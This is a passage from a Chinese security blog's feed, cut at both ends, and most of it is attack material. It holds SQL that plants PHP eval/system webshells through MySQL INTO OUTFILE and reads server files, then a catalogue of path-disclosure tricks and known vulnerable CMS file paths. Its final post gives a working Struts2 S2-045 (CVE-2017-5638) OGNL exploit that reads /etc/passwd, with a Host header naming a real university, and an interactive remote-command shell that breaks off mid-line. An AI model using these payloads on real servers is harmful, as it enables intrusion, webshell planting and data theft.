&apos;E:/wamp/www/1.php&apos;;</div><div class="line">#以上同时执行，在数据库: mysql 下创建一个表名为：io，字段为ioi，导出到E:/wamp/www/1.php</div><div class="line"></div><div class="line">一句话连接密码：io</div><div class="line">方法二：</div><div class="line">Create TABLE io (ioi text NOT NULL);</div><div class="line">Insert INTO io (ioi) VALUES(&apos;&lt;?php eval($_POST[io])?&gt;&apos;);</div><div class="line">select ioi from io into outfile &apos;E:/wamp/www/1.php&apos;;</div><div class="line">Drop TABLE IF EXISTS ioi;</div><div class="line"></div><div class="line"></div><div class="line">方法三：</div><div class="line">读取文件内容： select load_file(&apos;E:/xamp/www/s.php&apos;);</div><div class="line"></div><div class="line"></div><div class="line">写一句话：select &apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;INTO OUTFILE &apos;E:/xamp/www/1.php&apos;</div><div class="line"></div><div class="line"></div><div class="line">cmd执行权限：select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/xamp/www/1.php&apos;</div><div class="line"></div><div class="line">select load_file(&apos;E:/xamp/www/xiaoma.php&apos;);</div><div class="line"></div><div class="line">方法四：</div><div class="line">select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/xamp/www/xiaoma.php&apos;</div><div class="line">然后访问网站目录：http://www.xxxx.com/xiaoma.php?cmd=dir</div></pre></td></tr></table></figure>
<h1 id="php爆绝对路径方法"><a href="#php爆绝对路径方法" class="headerlink" title="php爆绝对路径方法"></a>php爆绝对路径方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div></pre></td><td class="code"><pre><div class="line">1、单引号爆路径</div><div class="line">说明：</div><div class="line">直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</div><div class="line">www.xxx.com/news.php?id=149′</div><div class="line"></div><div class="line"></div><div class="line">2、错误参数值爆路径</div><div class="line">说明：</div><div class="line">将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。</div><div class="line">www.xxx.com/researcharchive.php?id=-1</div><div class="line"></div><div class="line"></div><div class="line">3、Google爆路径</div><div class="line">说明：</div><div class="line">结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</div><div class="line">Site:xxx.edu.tw warning</div><div class="line">Site:xxx.com.tw “fatal error”</div><div class="line"></div><div class="line"></div><div class="line">4、测试文件爆路径</div><div class="line">说明：</div><div class="line">很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</div><div class="line">www.xxx.com/test.php</div><div class="line">www.xxx.com/ceshi.php</div><div class="line">www.xxx.com/info.php</div><div class="line">www.xxx.com/phpinfo.php</div><div class="line">www.xxx.com/php_info.php</div><div class="line">www.xxx.com/1.php</div><div class="line"></div><div class="line"></div><div class="line">5、phpmyadmin爆路径</div><div class="line">说明：</div><div class="line">一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</div><div class="line">1. /phpmyadmin/libraries/lect_lang.lib.php</div><div class="line">2./phpMyAdmin/index.php?lang[]=1</div><div class="line">3. /phpMyAdmin/phpinfo.php</div><div class="line">4. load_file()</div><div class="line">5./phpmyadmin/themes/darkblue_orange/layout.inc.php</div><div class="line">6./phpmyadmin/libraries/select_lang.lib.php</div><div class="line">7./phpmyadmin/libraries/lect_lang.lib.php</div><div class="line">8./phpmyadmin/libraries/mcrypt.lib.php</div><div class="line"></div><div class="line"></div><div class="line">6、配置文件找路径</div><div class="line">说明：</div><div class="line">如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</div><div class="line"></div><div class="line"></div><div class="line">Windows:</div><div class="line">c:\windows\php.ini php配置文件</div><div class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</div><div class="line"></div><div class="line"></div><div class="line">Linux:</div><div class="line">/etc/php.ini php配置文件</div><div class="line">/etc/httpd/conf.d/php.conf</div><div class="line">/etc/httpd/conf/httpd.conf Apache配置文件</div><div class="line">/usr/local/apache/conf/httpd.conf</div><div class="line">/usr/local/apache2/conf/httpd.conf</div><div class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</div><div class="line"></div><div class="line"></div><div class="line">7、nginx文件类型错误解析爆路径</div><div class="line">说明：</div><div class="line">要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径</div><div class="line">www.xxx.com/xx.jpg/x.php</div><div class="line"></div><div class="line"></div><div class="line">8、其他</div><div class="line">dedecms</div><div class="line">/member/templets/menulit.php</div><div class="line">plus/paycenter/alipay/return_url.php </div><div class="line">plus/paycenter/cbpayment/autoreceive.php</div><div class="line">paycenter/nps/config_pay_nps.php</div><div class="line">plus/task/dede-maketimehtml.php</div><div class="line">plus/task/dede-optimize-table.php</div><div class="line">plus/task/dede-upcache.php</div><div class="line"></div><div class="line"></div><div class="line">WP</div><div class="line">wp-admin/includes/file.php</div><div class="line">wp-content/themes/baiaogu-seo/footer.php</div><div class="line"></div><div class="line"></div><div class="line">ecshop商城系统暴路径漏洞文件</div><div class="line">/api/cron.php</div><div class="line">/wap/goods.php</div><div class="line">/temp/compiled/ur_here.lbi.php</div><div class="line">/temp/compiled/pages.lbi.php</div><div class="line">/temp/compiled/user_transaction.dwt.php</div><div class="line">/temp/compiled/history.lbi.php</div><div class="line">/temp/compiled/page_footer.lbi.php</div><div class="line">/temp/compiled/goods.dwt.php</div><div class="line">/temp/compiled/user_clips.dwt.php</div><div class="line">/temp/compiled/goods_article.lbi.php</div><div class="line">/temp/compiled/comments_list.lbi.php</div><div class="line">/temp/compiled/recommend_promotion.lbi.php</div><div class="line">/temp/compiled/search.dwt.php</div><div class="line">/temp/compiled/category_tree.lbi.php</div><div class="line">/temp/compiled/user_passport.dwt.php</div><div class="line">/temp/compiled/promotion_info.lbi.php</div><div class="line">/temp/compiled/user_menu.lbi.php</div><div class="line">/temp/compiled/message.dwt.php</div><div class="line">/temp/compiled/admin/pagefooter.htm.php</div><div class="line">/temp/compiled/admin/page.htm.php</div><div class="line">/temp/compiled/admin/start.htm.php</div><div class="line">/temp/compiled/admin/goods_search.htm.php</div><div class="line">/temp/compiled/admin/index.htm.php</div><div class="line">/temp/compiled/admin/order_list.htm.php</div><div class="line">/temp/compiled/admin/menu.htm.php</div><div class="line">/temp/compiled/admin/login.htm.php</div><div class="line">/temp/compiled/admin/message.htm.php</div><div class="line">/temp/compiled/admin/goods_list.htm.php</div><div class="line">/temp/compiled/admin/pageheader.htm.php</div><div class="line">/temp/compiled/admin/top.htm.php</div><div class="line">/temp/compiled/top10.lbi.php</div><div class="line">/temp/compiled/member_info.lbi.php</div><div class="line">/temp/compiled/bought_goods.lbi.php</div><div class="line">/temp/compiled/goods_related.lbi.php</div><div class="line">/temp/compiled/page_header.lbi.php</div><div class="line">/temp/compiled/goods_script.html.php</div><div class="line">/temp/compiled/index.dwt.php</div><div class="line">/temp/compiled/goods_fittings.lbi.php</div><div class="line">/temp/compiled/myship.dwt.php</div><div class="line">/temp/compiled/brands.lbi.php</div><div class="line">/temp/compiled/help.lbi.php</div><div class="line">/temp/compiled/goods_gallery.lbi.php</div><div class="line">/temp/compiled/comments.lbi.php</div><div class="line">/temp/compiled/myship.lbi.php</div><div class="line">/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php</div><div class="line">/includes/modules/cron/auto_manage.php</div><div class="line">/includes/modules/cron/ipdel.php</div><div class="line"></div><div class="line"></div><div class="line">ucenter爆路径</div><div class="line">ucenter\control\admin\db.php</div><div class="line"></div><div class="line"></div><div class="line">DZbbs</div><div class="line">manyou/admincp.php?my_suffix=%0A%0DTOBY57</div><div class="line"></div><div class="line"></div><div class="line">z-blog</div><div class="line">admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</div><div class="line"></div><div class="line"></div><div class="line">php168爆路径</div><div class="line">admin/inc/hack/count.php?job=list</div><div class="line">admin/inc/hack/search.php?job=getcode</div><div class="line">admin/inc/ajax/bencandy.php?job=do</div><div class="line">cache/MysqlTime.txt</div><div class="line"></div><div class="line"></div><div class="line">PHPcms2008-sp4</div><div class="line">注册用户登陆后访问</div><div class="line">phpcms/corpandresize/process.php?pic=../images/logo.gif</div><div class="line"></div><div class="line"></div><div class="line">bo-blog</div><div class="line">PoC:</div><div class="line">/go.php/&lt;[evil code]</div><div class="line">CMSeasy爆网站路径漏洞</div><div class="line">漏洞出现在menu_top.php这个文件中</div><div class="line">lib/mods/celive/menu_top.php</div><div class="line">/lib/default/ballot_act.php</div><div class="line">lib/default/special_act.php</div></pre></td></tr></table></figure>
<h2 id="相关文章链接"><a href="#相关文章链接" class="headerlink" title="相关文章链接"></a>相关文章链接</h2><p><a href="https://www.t00ls.net/articles-26813.html" target="_blank" rel="external">低权限读文件</a><br><a href="http://blog.cora-lab.org/287.html" target="_blank" rel="external">SQL语句利用日志写shell</a><br><a href="http://www.cnblogs.com/devi1o/articles/5179206.html" target="_blank" rel="external">phpmyadmin获取shell方法总结</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我&quot;&gt;&lt;a href=&quot;#看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我&quot; class=&quot;headerlink&quot; title=&quot;看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~&quot;&gt;&lt;/a&gt;看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~&lt;/h3&gt;&lt;h1 id=&quot;低权限读文件&quot;&gt;&lt;a href=&quot;#低权限读文件&quot; class=&quot;headerlink&quot; title=&quot;低权限读文件&quot;&gt;&lt;/a&gt;低权限读文件&lt;/h1&gt;&lt;h3 id=&quot;用到的mysql语句&quot;&gt;&lt;a href=&quot;#用到的mysql语句&quot; class=&quot;headerlink&quot; title=&quot;用到的mysql语句&quot;&gt;&lt;/a&gt;用到的mysql语句&lt;/h3&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;LOAD&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DATA&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;LOCAL&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INFILE&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;C:/mysql/data/mysql/user.MYD&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;terminated&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;LINES&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TERMINATED&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件&quot;&gt;&lt;a href=&quot;#LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件&quot; class=&quot;headerlink&quot; title=&quot;LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件&quot;&gt;&lt;/a&gt;LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件
若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE  就不能读该文件
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD&quot;&gt;&lt;a href=&quot;#使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD&quot; class=&quot;headerlink&quot; title=&quot;使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD&quot;&gt;&lt;/a&gt;使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="phpmyadmin" scheme="http://iosmosis.github.io/tags/phpmyadmin/"/>
    
      <category term="Getshell" scheme="http://iosmosis.github.io/tags/Getshell/"/>
    
      <category term="mysql" scheme="http://iosmosis.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>不如慢慢走下去</title>
    <link href="http://iosmosis.github.io/2017/04/07/Time/"/>
    <id>http://iosmosis.github.io/2017/04/07/Time/</id>
    <published>2017-04-07T04:47:01.000Z</published>
    <updated>2017-04-08T16:46:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07&lt;/p&gt;

    
    </summary>
    
    
      <category term="About Me" scheme="http://iosmosis.github.io/tags/About-Me/"/>
    
      <category term="随笔" scheme="http://iosmosis.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</title>
    <link href="http://iosmosis.github.io/2017/03/07/str2-045/"/>
    <id>http://iosmosis.github.io/2017/03/07/str2-045/</id>
    <published>2017-03-07T07:02:56.000Z</published>
    <updated>2017-04-08T15:14:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><br></p>
<h3 id="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"><a href="#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。" class="headerlink" title="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"></a>近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</h3><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><h3 id="S2-045，CVE-2017-5638"><a href="#S2-045，CVE-2017-5638" class="headerlink" title="S2-045，CVE-2017-5638"></a>S2-045，CVE-2017-5638</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><h3 id="基于-Jakarta-plugin插件的Struts远程代码执行漏洞"><a href="#基于-Jakarta-plugin插件的Struts远程代码执行漏洞" class="headerlink" title="基于 Jakarta plugin插件的Struts远程代码执行漏洞"></a>基于 Jakarta plugin插件的Struts远程代码执行漏洞</h3><h2 id="官方评级"><a href="#官方评级" class="headerlink" title="官方评级"></a>官方评级</h2><h3 id="高危"><a href="#高危" class="headerlink" title="高危"></a>高危</h3><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"><a href="#Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令" class="headerlink" title="Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"></a>Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</h3><h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式"></a>漏洞利用条件和方式</h2><h3 id="黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。"><a href="#黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。" class="headerlink" title="黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。"></a>黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</h3><p>1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能<br>2.恶意攻击者精心构造Content-Type的值</p>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><h3 id="Struts-2-3-5-–-Struts-2-3-31"><a href="#Struts-2-3-5-–-Struts-2-3-31" class="headerlink" title="Struts 2.3.5 – Struts 2.3.31"></a>Struts 2.3.5 – Struts 2.3.31</h3><pre><code>Struts 2.5 – Struts 2.5.10
Created by Lukasz Lenart, last modified yesterday at 01:14 PM
</code></pre><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</div><div class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</div><div class="line"></div><div class="line">header1 =&#123;</div><div class="line"><span class="string">"Host"</span>:<span class="string">"alumnus.shu.edu.cn"</span>,</div><div class="line"><span class="string">"Connection"</span>:<span class="string">"keep-alive"</span>,</div><div class="line"><span class="string">"Refer"</span>:<span class="string">"alumnus.shu.edu.cn"</span>,</div><div class="line"><span class="string">"Accept"</span>:<span class="string">"*/*"</span>,</div><div class="line"><span class="string">"X-Requested-With"</span>:<span class="string">"XMLHttpRequest"</span>,</div><div class="line"><span class="string">"Accept-Encoding"</span>:<span class="string">"deflate"</span>,</div><div class="line"><span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></div><div class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">'''%&#123;(#nike='multipart/form-data').</span></div><div class="line">    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</div><div class="line">    (#_memberAccess?(#_memberAccess=#dm):</div><div class="line">    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).</div><div class="line">    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</div><div class="line">    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</div><div class="line">    (#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').</div><div class="line">    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</div><div class="line">    (#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</div><div class="line">    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).</div><div class="line">    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().</div><div class="line">    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).</div><div class="line">    (#ros.flush())&#125;'''</div><div class="line">    request = urllib2.Request(str(sys.argv[<span class="number">1</span>]),datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    <span class="keyword">print</span> response.read()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">poc()</div></pre></td></tr></table></figure>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests,json,re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poc</span><span class="params">(url,command)</span>:</span></div><div class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16'</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>&#125;</div><div class="line">    headers[<span class="string">"Content-Type"</span>] = <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \</span></div><div class="line">                          "+command+<span class="string">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line"></div><div class="line">    data = json.dumps(&#123;<span class="string">"image1"</span>:url&#125;)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        req = requests.post(url,data=data,headers=headers)</div><div class="line">        <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</div><div class="line">            <span class="keyword">print</span> req.content</div><div class="line">    <span class="keyword">except</span> requests.ConnectionError,e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line"></div><div class="line">th = &#123;<span class="string">"url"</span>:<span class="string">""</span>&#125;</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> th.get(<span class="string">"url"</span>) != <span class="string">""</span>:</div><div class="line">        input_cmd = raw_input(<span class="string">"cmd &gt;&gt;: "</span>)</div><div class="line">        <span class="keyword">if</span> input_cmd == <span class="string">"exit"</span>:</div><div class="line">            exit()</div><div class="line">        <span class="keyword">elif</span> input_cmd == <span class="string">'set'</span>:</div><div class="line">            url = 